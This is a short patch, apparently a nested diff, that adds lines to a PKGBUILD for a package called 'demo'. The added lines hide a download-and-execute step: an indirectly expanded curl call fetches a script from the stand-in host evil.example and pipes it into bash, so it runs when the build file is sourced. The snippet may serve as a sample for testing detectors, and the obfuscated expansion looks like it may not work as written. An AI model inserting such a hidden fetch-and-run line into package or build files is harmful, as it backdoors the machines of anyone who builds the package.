@@ -1,0 +1,9 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,6 @@
+ pkgname=demo
+ pkgver=1.0
++C=curl
++bash <<'EOF'
++${!C} https://evil.example/p.sh | bash
++EOF
